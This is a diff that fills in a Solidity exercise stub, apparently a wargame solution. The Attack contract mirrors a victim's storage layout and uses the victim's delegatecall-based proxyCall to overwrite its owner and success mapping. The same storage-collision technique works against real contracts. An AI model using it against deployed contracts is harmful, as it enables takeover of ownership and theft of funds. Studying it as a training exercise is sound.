@@ -3,23 +3,30 @@ pragma solidity ^0.8.0;
 
 interface ID31eg4t3 {
     function proxyCall(bytes calldata data) external returns (address);
-    function changeResult() external;
+    function modifyState() external;
 }
 
 contract Attack {
-    address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
+    uint256 counter;
+    uint8 index;
+    string private identifier;
+    address private delegate;
+    uint8 flag;
+    address public contractOwner;
+    mapping(address => bool) public isSuccessful;
+    address internal immutable targetContract;
 
-    constructor(address addr) payable {
-        victim = addr;
+    constructor(address targetAddress) payable {
+        targetContract = targetAddress;
     }
 
-    // NOTE: You might need some malicious function here
+    function updateState(address newOwner) public {
+        isSuccessful[newOwner] = true;
+        contractOwner = newOwner;
+    }
 
     function exploit() external {
-        // TODO: Add your implementation here
-        // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        bytes memory payload = abi.encodeWithSignature("updateState(address)", msg.sender);
+        ID31eg4t3(targetContract).proxyCall(payload);
     }
 }
